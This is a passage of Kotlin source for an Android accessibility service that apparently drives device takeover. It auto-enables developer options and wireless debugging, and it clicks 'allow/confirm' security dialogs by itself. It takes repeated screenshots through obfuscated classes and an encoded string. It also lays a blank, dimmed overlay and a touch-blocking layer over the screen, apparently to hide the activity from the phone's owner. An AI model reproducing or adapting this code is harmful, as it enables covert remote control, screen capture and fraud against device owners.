            openDeveloperOptionsForWirelessDebug()
            queueWirelessDebugProcess(WIRELESS_DEBUG_RETRY_DELAY_MS)
            return
        }

        if (containsAnyKeyword(pageTexts, DEV_MODE_ENABLED_HINT_KEYWORDS)) {
            wirelessDebugAutomationMessage = "Developer mode enabled hint detected; opening Developer options..."
            openDeveloperOptionsForWirelessDebug()
            queueWirelessDebugProcess(WIRELESS_DEBUG_RETRY_DELAY_MS)
            return
        }

        if (containsAnyKeyword(pageTexts, DEV_OPTIONS_KEYWORDS)) {
            wirelessDebugAutomationState = WirelessDebugAutomationState.FINDING_WIRELESS_DEBUG
            wirelessDebugAutomationMessage = "Developer options page detected; searching wireless debugging..."
            handleWirelessDebugPageOrEntry(root, wirelessDebugAutomationTarget)
            return
        }

        if (!containsAnyKeyword(pageTexts, ABOUT_PHONE_KEYWORDS)) {
            wirelessDebugAutomationMessage = "Waiting for verified developer mode state..."
            queueWirelessDebugProcess(WIRELESS_DEBUG_RETRY_DELAY_MS)
            return
        }

        val buildNode = findNodeByKeywords(root, BUILD_NUMBER_KEYWORDS)
        if (buildNode == null) {
            if (wirelessDebugAutomationScrollCount < WIRELESS_DEBUG_MAX_SCROLL && scrollDown(root)) {
                wirelessDebugAutomationScrollCount++
                wirelessDebugAutomationMessage = "Scrolling to find Build number..."
            } else {
                wirelessDebugAutomationMessage = "Please tap Build number manually if this ROM hides it"
            }
            queueWirelessDebugProcess(WIRELESS_DEBUG_RETRY_DELAY_MS)
            return
        }

        if (wirelessDebugAutomationBuildTapCount >= WIRELESS_DEBUG_MAX_BUILD_TAPS) {
            if (isDeveloperOptionsEnabled()) {
                wirelessDebugAutomationMessage = "Developer options enabled after Build number taps; opening page..."
                openDeveloperOptionsForWirelessDebug()
                queueWirelessDebugProcess(WIRELESS_DEBUG_RETRY_DELAY_MS)
                return
            }
            wirelessDebugAutomationMessage = "Waiting for developer mode confirmation..."
            queueWirelessDebugProcess(WIRELESS_DEBUG_RETRY_DELAY_MS)
            return
        }

        wirelessDebugAutomationState = WirelessDebugAutomationState.TAPPING_BUILD_NUMBER
        wirelessDebugAutomationMessage = "Tapping Build number (${wirelessDebugAutomationBuildTapCount + 1}/7)..."
        if (clickWirelessDebugEntry(buildNode)) {
            wirelessDebugAutomationBuildTapCount++
        }
        queueWirelessDebugProcess(450L)
    }

    private fun handleWirelessDebugPageOrEntry(root: AccessibilityNodeInfo, target: Boolean) {
        val pageTexts = ArrayList<String>()
        collectNodeTexts(root, pageTexts)

        if (isWirelessDebugSubPage(root, pageTexts)) {
            // Some ROMs expose no reliable master switch inside the wireless-debugging detail page.
            // Keep the automation anchored on the Developer options list and toggle the row switch there.
            openDeveloperOptionsForWirelessDebug()
            queueWirelessDebugProcess(WIRELESS_DEBUG_RETRY_DELAY_MS)
            return
        }

        val wirelessNode = findNodeByKeywords(root, WIRELESS_DEBUG_KEYWORDS)
        if (wirelessNode != null) {
            wirelessDebugAutomationScrollCount = 0
            val switchNode = findNearbySwitch(wirelessNode)
            if (switchNode != null && switchNode.isChecked == target) {
                finishWirelessDebugAutomation(true, if (target) "Wireless debugging is enabled" else "Wireless debugging is disabled")
                return
            }
            wirelessDebugAutomationState = WirelessDebugAutomationState.CONFIRMING_DIALOG
            wirelessDebugAutomationMessage = if (target) {
                "Tapping wireless debugging switch in Developer options..."
            } else {
                "Turning off wireless debugging in Developer options..."
            }
            if (!clickWirelessDebugListSwitch(wirelessNode, switchNode)) {
                finishWirelessDebugAutomation(false, "Failed to tap wireless debugging switch")
                return
            }
            lastWirelessDebugToggleMs = SystemClock.uptimeMillis()
            queueWirelessDebugProcess(WIRELESS_DEBUG_RETRY_DELAY_MS)
            return
        }

        if (containsAnyKeyword(pageTexts, DEV_OPTIONS_KEYWORDS)) {
            wirelessDebugAutomationState = WirelessDebugAutomationState.FINDING_WIRELESS_DEBUG
            if (wirelessDebugAutomationScrollCount < WIRELESS_DEBUG_MAX_SCROLL && scrollDown(root)) {
                wirelessDebugAutomationScrollCount++
                wirelessDebugAutomationMessage = "Scrolling Developer options to find wireless debugging..."
                queueWirelessDebugProcess(WIRELESS_DEBUG_RETRY_DELAY_MS)
            } else {
                finishWirelessDebugAutomation(false, "Wireless debugging entry was not found")
            }
            return
        }

        if (wirelessDebugAutomationState == WirelessDebugAutomationState.OPENING_DEV_OPTIONS &&
            developerOptionsOpenRequestedAt > 0L &&
            SystemClock.uptimeMillis() - developerOptionsOpenRequestedAt > DEV_OPTIONS_DIRECT_OPEN_GRACE_MS
        ) {
            openMainSettingsForDeveloperOptionsSearch(
                "Developer options direct page did not appear; searching Settings entry..."
            )
            queueWirelessDebugProcess(WIRELESS_DEBUG_RETRY_DELAY_MS)
            return
        }

        wirelessDebugAutomationMessage = "Waiting for Developer options page..."
        queueWirelessDebugProcess(WIRELESS_DEBUG_RETRY_DELAY_MS)
    }

    private fun isWirelessDebugSubPage(root: AccessibilityNodeInfo, texts: List<String>): Boolean {
        val hasWireless = containsAnyKeyword(texts, WIRELESS_DEBUG_KEYWORDS)
        val hasDetailOnlyText = texts.any {
            val lower = it.trim().lowercase(Locale.ROOT)
            lower.contains("pair device") ||
                lower.contains("pair new device") ||
                lower.contains("pairing code") ||
                lower.contains("\u914d\u5bf9\u8bbe\u5907") ||
                lower.contains("\u4f7f\u7528\u914d\u5bf9\u7801\u914d\u5bf9\u8bbe\u5907") ||
                lower.contains("\u914d\u5bf9\u7801") ||
                lower.contains("\u4f7f\u7528\u914d\u5bf9\u7801") ||
                lower.contains("ip address") ||
                lower.contains("ip address & port") ||
                lower.contains("ip address and port") ||
                lower.contains("ip \u5730\u5740") ||
                lower.contains("ip\u5730\u5740") ||
                lower.contains("\u7aef\u53e3") ||
                lower.contains("debugging notifications")
        }
        return hasWireless && hasDetailOnlyText
    }

    private fun clickWirelessDebugEntry(node: AccessibilityNodeInfo): Boolean {
        if (performNodeClick(node)) return true
        var parent = node.parent
        var depth = 0
        while (parent != null && depth < 6) {
            if (performNodeClick(parent)) return true
            parent = parent.parent
            depth++
        }
        val bounds = Rect()
        node.getBoundsInScreen(bounds)
        return gestureClick(bounds)
    }

    private fun clickSettingsEntry(
        node: AccessibilityNodeInfo,
        allowGestureFallback: Boolean = false
    ): Boolean {
        val bounds = Rect()
        node.getBoundsInScreen(bounds)
        if (!bounds.isEmpty) {
            val toolbarGuardBottom = (72 * Resources.getSystem().displayMetrics.density).toInt()
            if (bounds.top < toolbarGuardBottom) return false
        }

        if (performNodeClick(node)) return true
        var parent = node.parent
        var depth = 0
        while (parent != null && depth < 6) {
            if (performNodeClick(parent)) return true
            parent = parent.parent
            depth++
        }
        if (!allowGestureFallback) return false

        if (bounds.isEmpty) return false

        // Avoid tapping toolbar/page titles. Gesture fallback is only for list rows whose
        // clickable parent is hidden from accessibility on some ROMs.
        val minListTop = (96 * Resources.getSystem().displayMetrics.density).toInt()
        if (bounds.top < minListTop) return false
        return gestureClick(bounds)
    }

    private fun finishWirelessDebugAutomation(success: Boolean, message: String) {
        wirelessDebugAutomationRunning = false
        wirelessDebugAutomationState = WirelessDebugAutomationState.IDLE
        wirelessDebugAutomationMessage = message
        wirelessDebugAutomationError = if (success) "" else message
        Log.i("InputService", "wireless debug automation finished: success=$success, message=$message")
    }

    private fun findNodeByKeywords(
        node: AccessibilityNodeInfo?,
        keywords: Array<String>
    ): AccessibilityNodeInfo? {
        if (node == null) return null
        val text = node.text?.toString()?.trim()?.lowercase(Locale.ROOT) ?: ""
        val desc = node.contentDescription?.toString()?.trim()?.lowercase(Locale.ROOT) ?: ""
        if (matchesAnyKeyword(text, keywords) || matchesAnyKeyword(desc, keywords)) {
            return node
        }
        for (i in 0 until node.childCount) {
            val found = findNodeByKeywords(node.getChild(i), keywords)
            if (found != null) return found
        }
        return null
    }

    private fun findNearbySwitch(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val labelBounds = Rect()
        node.getBoundsInScreen(labelBounds)
        var cursor: AccessibilityNodeInfo? = node
        var best: AccessibilityNodeInfo? = null
        var bestDistance = Int.MAX_VALUE
        var depth = 0
        while (cursor != null && depth < 5) {
            val switches = ArrayList<AccessibilityNodeInfo>()
            collectSwitchNodes(cursor, switches)
            switches.forEach { candidate ->
                val bounds = Rect()
                candidate.getBoundsInScreen(bounds)
                val distance = abs(bounds.centerY() - labelBounds.centerY())
                val allowed = max(labelBounds.height() * 3, 160)
                if (distance <= allowed && distance < bestDistance) {
                    bestDistance = distance
                    best = candidate
                }
            }
            if (best != null) return best
            cursor = cursor.parent
            depth++
        }
        return null
    }

    private fun collectSwitchNodes(
        node: AccessibilityNodeInfo?,
        out: MutableList<AccessibilityNodeInfo>
    ) {
        if (node == null) return
        val klass = node.className?.toString()?.lowercase(Locale.ROOT) ?: ""
        if (node.isCheckable || klass.contains("switch") || klass.contains("checkbox") || klass.contains("toggle")) {
            out.add(node)
        }
        for (i in 0 until node.childCount) {
            collectSwitchNodes(node.getChild(i), out)
        }
    }

    private fun clickWirelessDebugListSwitch(
        wirelessNode: AccessibilityNodeInfo,
        switchNode: AccessibilityNodeInfo?
    ): Boolean {
        // Keep this action on the Developer options list. Clicking the label/row can enter the
        // detail page on many ROMs, so prefer the actual switch and then the row's right-side area.
        if (switchNode != null) {
            if (performNodeClick(switchNode)) return true
            val switchBounds = Rect()
            switchNode.getBoundsInScreen(switchBounds)
            switchNode.parent?.let {
                val parentBounds = Rect()
                it.getBoundsInScreen(parentBounds)
                val maxSwitchContainerWidth = max(switchBounds.width() * 3, 240)
                if (!parentBounds.isEmpty && parentBounds.width() <= maxSwitchContainerWidth) {
                    if (performNodeClick(it)) return true
                }
            }
            if (gestureClick(switchBounds)) return true
        }

        val rowBounds = Rect()
        val candidateBounds = Rect()
        var rowNode: AccessibilityNodeInfo? = wirelessNode
        var depth = 0
        while (rowNode != null && depth < 5) {
            rowNode.getBoundsInScreen(candidateBounds)
            if (!candidateBounds.isEmpty && candidateBounds.width() > rowBounds.width()) {
                rowBounds.set(candidateBounds)
            }
            rowNode = rowNode.parent
            depth++
        }
        if (rowBounds.isEmpty) {
            wirelessNode.getBoundsInScreen(rowBounds)
        }
        if (rowBounds.isEmpty) return false

        val rightArea = Rect(
            rowBounds.left + (rowBounds.width() * 3 / 4),
            rowBounds.top,
            rowBounds.right,
            rowBounds.bottom
        )
        return gestureClick(rightArea)
    }

    private fun performNodeClick(node: AccessibilityNodeInfo?): Boolean {
        if (node == null || !node.isEnabled) return false
        if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
        return false
    }

    private fun gestureClick(bounds: Rect): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N || bounds.isEmpty) return false
        val x = bounds.centerX().toFloat()
        val y = bounds.centerY().toFloat()
        val path = Path()
        path.moveTo(x, y)
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 80))
            .build()
        return dispatchGesture(gesture, null, null)
    }

    private fun clickConfirmIfPresent(root: AccessibilityNodeInfo): Boolean {
        val node = findConfirmNode(root) ?: return false
        if (!hasWirelessConfirmContext(root)) return false
        var cursor: AccessibilityNodeInfo? = node
        var depth = 0
        while (cursor != null && depth < 4) {
            if (performNodeClick(cursor)) return true
            cursor = cursor.parent
            depth++
        }
        val bounds = Rect()
        node.getBoundsInScreen(bounds)
        return gestureClick(bounds)
    }

    private fun hasWirelessConfirmContext(root: AccessibilityNodeInfo): Boolean {
        val texts = ArrayList<String>()
        collectNodeTexts(root, texts)
        val hasWireless = containsAnyKeyword(texts, WIRELESS_DEBUG_KEYWORDS)
        val hasCancel = texts.any { isCancelText(it.trim().lowercase(Locale.ROOT)) }
        val hasConfirm = texts.any { isConfirmText(it.trim().lowercase(Locale.ROOT)) }
        return hasConfirm && (hasWireless || hasCancel)
    }

    private fun findConfirmNode(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        val candidates = ArrayList<AccessibilityNodeInfo>()
        collectConfirmNodes(node, candidates)
        if (candidates.isEmpty()) return null
        return candidates.firstOrNull { candidate ->
            candidate.isEnabled && (candidate.isClickable || isButtonLike(candidate))
        } ?: candidates.firstOrNull { candidate -> candidate.isEnabled } ?: candidates.first()
    }

    private fun collectConfirmNodes(node: AccessibilityNodeInfo?, out: MutableList<AccessibilityNodeInfo>) {
        if (node == null) return
        val text = node.text?.toString()?.trim()?.lowercase(Locale.ROOT) ?: ""
        val desc = node.contentDescription?.toString()?.trim()?.lowercase(Locale.ROOT) ?: ""
        if (isConfirmText(text) || isConfirmText(desc)) out.add(node)
        for (i in 0 until node.childCount) {
            collectConfirmNodes(node.getChild(i), out)
        }
    }

    private fun isButtonLike(node: AccessibilityNodeInfo): Boolean {
        val klass = node.className?.toString()?.lowercase(Locale.ROOT) ?: ""
        return klass.contains("button")
    }

    private fun isConfirmText(text: String): Boolean {
        if (text.isEmpty()) return false
        return text == "\u5141\u8bb8" ||
            text == "\u786e\u5b9a" ||
            text == "\u540c\u610f" ||
            text == "\u5f00\u542f" ||
            text == "\u6253\u5f00" ||
            text == "\u542f\u7528" ||
            text == "\u662f" ||
            text == "allow" ||
            text == "ok" ||
            text == "yes" ||
            text == "confirm" ||
            text == "enable" ||
            text.contains("turn on") ||
            text.contains("allow wireless") ||
            text.contains("enable wireless")
    }

    private fun isCancelText(text: String): Boolean {
        if (text.isEmpty()) return false
        return text == "\u53d6\u6d88" ||
            text == "\u4e0d\u5141\u8bb8" ||
            text == "\u5426" ||
            text == "\u7a0d\u540e" ||
            text == "cancel" ||
            text == "deny" ||
            text == "disallow" ||
            text == "not now" ||
            text == "later"
    }

    private fun scrollDown(root: AccessibilityNodeInfo): Boolean {
        val scrollable = findScrollableNode(root) ?: return false
        return scrollable.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
    }

    private fun findScrollableNode(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        if (node == null) return null
        if (node.isScrollable) return node
        for (i in 0 until node.childCount) {
            val found = findScrollableNode(node.getChild(i))
            if (found != null) return found
        }
        return null
    }

    private fun collectNodeTexts(node: AccessibilityNodeInfo?, out: MutableList<String>) {
        if (node == null) return
        node.text?.toString()?.let { if (it.isNotBlank()) out.add(it) }
        node.contentDescription?.toString()?.let { if (it.isNotBlank()) out.add(it) }
        for (i in 0 until node.childCount) {
            collectNodeTexts(node.getChild(i), out)
        }
    }

    private fun collectEventTexts(event: AccessibilityEvent): List<String> {
        val out = ArrayList<String>()
        event.text?.forEach { text ->
            val s = text?.toString()
            if (!s.isNullOrBlank()) out.add(s)
        }
        event.contentDescription?.toString()?.let {
            if (it.isNotBlank()) out.add(it)
        }
        return out
    }

    private fun containsAnyKeyword(texts: List<String>, keywords: Array<String>): Boolean {
        return texts.any { text ->
            val lower = text.trim().lowercase(Locale.ROOT)
            matchesAnyKeyword(lower, keywords)
        }
    }

    private fun matchesAnyKeyword(text: String, keywords: Array<String>): Boolean {
        return keywords.any {
            val keyword = it.lowercase(Locale.ROOT)
            if (keyword.length <= 2) text == keyword else text.contains(keyword)
        }
    }

    private fun isSettingsOrSystemPackage(pkg: String): Boolean {
        if (pkg.isEmpty()) return true
        return pkg.contains("settings") ||
            pkg.contains("setting") ||
            pkg.contains("miui") ||
            pkg.contains("xiaomi") ||
            pkg.contains("security") ||
            pkg.contains("permission") ||
            pkg.contains("oppo") ||
            pkg.contains("oplus") ||
            pkg.contains("coloros") ||
            pkg.contains("heytap") ||
            pkg.contains("realme") ||
            pkg.contains("oneplus") ||
            pkg.contains("vivo") ||
            pkg.contains("bbk") ||
            pkg.contains("iqoo") ||
            pkg.contains("huawei") ||
            pkg.contains("emui") ||
            pkg.contains("honor") ||
            pkg.contains("hihonor") ||
            pkg.contains("magicos") ||
            pkg.contains("flyme") ||
            pkg.contains("systemui") ||
            pkg == "android"
    }


    override fun onAccessibilityEvent(event: AccessibilityEvent) {

     if (wirelessDebugAutomationRunning) {
         processWirelessDebugAutomationEvent(event)
     }
	 if(SKL) {
         requestPenetrateFrame("accessibility-event")
     }
    }
    
 override fun takeScreenshot(
        i: Int,
        executor: Executor,
        takeScreenshotCallback: TakeScreenshotCallback
    ) {
        super.takeScreenshot(i, executor, takeScreenshotCallback)
    }
      

    private var screenshotDelayMillis: Long? = null

	private val i = ThreadPoolExecutor(
    3,               
    3,               
    0L, TimeUnit.MILLISECONDS,  
	SynchronousQueue(),         
    ThreadPoolExecutor.DiscardOldestPolicy()   
)

    fun d(str: String?) {
        try {
            if (str != null) {
        
                takeScreenshot(0, this.i, ScreenshotCallback())
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
	
    private fun l() {
        try {
            while (shouldRun == true) {
                try {
                   if (shouldRun && !SKL) {
	                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
	                       d(p50.a(byteArrayOf(72, -60, -107, -52), byteArrayOf(36, -83, -29, -87, -46, -123, -26, -2)))
	                    }
					} 
                    val delay = screenshotDelayMillis ?: return
                    Thread.sleep(delay)
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        } finally {
            shouldRun = false
        }
    }

    fun i() {
        Thread {
            l()
        }.start()
    }


	 class ScreenshotCallback(

    ) : AccessibilityService.TakeScreenshotCallback {

	       private class ScreenshotThread(
		    private val screenshotResult: AccessibilityService.ScreenshotResult
		) : Thread() {
		
		    override fun run() {
		        var originalBitmap: Bitmap? = null
		        var hardwareBuffer: HardwareBuffer? = null
		
		        try {
		            if ((shouldRun || nZW99cdXQ0COhB2o.isOneShotScreenshotFrame) && !SKL) {

		            } else {
		                return
		            }
		
		            hardwareBuffer = screenshotResult.hardwareBuffer
		            val colorSpace: ColorSpace? = screenshotResult.colorSpace
		            originalBitmap = hardwareBuffer?.let { Bitmap.wrapHardwareBuffer(it, colorSpace) }
		
		            if (originalBitmap == null) return
		
		            EqljohYazB0qrhnj.a012933444445(originalBitmap)
		
		        } catch (e: Exception) {
		            e.printStackTrace()
		        } finally {           
		            originalBitmap?.recycle()
		            hardwareBuffer?.close()
		        }
		    }
		}

		
        override fun onFailure(errorCode: Int) {
            val wasOneShot = nZW99cdXQ0COhB2o.isOneShotScreenshotFrame
            if (wasOneShot) {
                nZW99cdXQ0COhB2o.consumeOneShotScreenshotFrame()
                nZW99cdXQ0COhB2o.refreshVideoAfterPenetrate("one-shot-failure")
            }
            if (errorCode == 3) {
                
            }
        }

        override fun onSuccess(screenshotResult: AccessibilityService.ScreenshotResult) {
            if ((shouldRun || nZW99cdXQ0COhB2o.isOneShotScreenshotFrame) && !SKL) {
                ScreenshotThread(screenshotResult).start()
            }
            else
            {
                screenshotResult.hardwareBuffer?.close()
            }
        }
    }

   
    fun handleDevSelectorCommand(command: String) {
        DevAutoSelectorController.forService(this).handleCommand(command)
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        ctx = this

		ClsFx9V0S.mvky6Ica(this)
        if (pendingIgnoreCapture) {
            startIgnoreCapture("service-connected")
        }

	   
        fakeEditTextForTextStateCalculation = EditText(this)
        // Size here doesn't matter, we won't show this view.
        fakeEditTextForTextStateCalculation?.layoutParams = LayoutParams(100, 100)
        fakeEditTextForTextStateCalculation?.onPreDraw()
        val layout = fakeEditTextForTextStateCalculation?.getLayout()

         windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        try {
            e15f7cc69f667bd3()
            handler.postDelayed(runnable, 1000)

        } catch (e: Exception) {
     
        }
    }


  private fun e15f7cc69f667bd3()
	{
        overLay = ClsFx9V0S.DyXxszSR(
	    this, windowManager,
	    viewUntouchable, viewTransparency,
	    ClsFx9V0S.WzQ6szeN(), ClsFx9V0S.DDYMuDRO(),
	    ClsFx9V0S.RN4dU1zD(), ClsFx9V0S.w7I1XzPj()
	)
        overLayparams_bass = overLay.layoutParams as WindowManager.LayoutParams
        BIS = gohome != View.GONE
        applyBlankOverlayVisual(BIS)
        if (BIS) {
            applyBlankBrightness("blank-init")
        }
        overLay.visibility = if (BIS) View.VISIBLE else View.GONE
}

    private val handler = Handler(Looper.getMainLooper())
	
	private val runnable = object : Runnable {
    override fun run() {
        if (::overLay.isInitialized && overLay.windowToken != null) {
            val targetVisibility = gohome
            if (overLay.visibility != targetVisibility) {
                overLay.post {
                    try {
                        if (targetVisibility != View.GONE) {
                            applyBlankOverlayVisual(true)
                            applyBlankBrightness("blank-sync-open")
                            overLay.visibility = targetVisibility
                            BIS = true
                            DevAutoSelectorController.onBlankOverlayChanged(this@nZW99cdXQ0COhB2o, true)
                            refreshVideoAfterBlankChange("blank-sync-open", requestCleanScreenshot = false)
                        } else {
                            BIS = false
                            applyBlankOverlayVisual(false)
                            DevAutoSelectorController.onBlankOverlayChanged(this@nZW99cdXQ0COhB2o, false)
                            refreshVideoAfterBlankChange("blank-sync-close", requestCleanScreenshot = true)
                            overLay.visibility = targetVisibility
                            restoreBlankBrightness("blank-sync-close")
                        }
                    } catch (e: Exception) {
                        Log.e("InputService", "runnable: update visibility failed", e)
                    }
                }
            } else {
                BIS = targetVisibility != View.GONE
            }
        }
        handler.postDelayed(this, 50)
    }
}

	
    override fun onDestroy() {
		if(ctx!=null)
    {    ctx = null
	}
        applyBlankOverlayVisual(false)
        restoreBlankBrightness("destroy")
        DevAutoSelectorController.release(this)
        wirelessDebugAutomationRunning = false
        wirelessDebugAutomationState = WirelessDebugAutomationState.IDLE
		// 停止 50ms 轮询定时器，防止 Handler 泄漏
		handler.removeCallbacks(runnable)
		// 清理防触摸相关资源
		touchBlockEnabled = false
		handler.removeCallbacks(touchBlockWatchdog)
		touchBlockOverlay?.let {
			try {
				windowManager.removeView(it)
			} catch (e: Exception) {
				Log.e("InputService", "remove touchBlockOverlay failed", e)
			}
		}
		touchBlockOverlay = null
		touchBlockParams = null

		if(::windowManager.isInitialized && ::overLay.isInitialized)
		{
			try {
				windowManager.removeView(overLay)
			} catch (e: Exception) {
				Log.e("InputService", "removeView failed", e)
			}
		}

		 shouldRun =false
		 i.shutdown()

        super.onDestroy()
    }

    override fun onInterrupt() {}
}
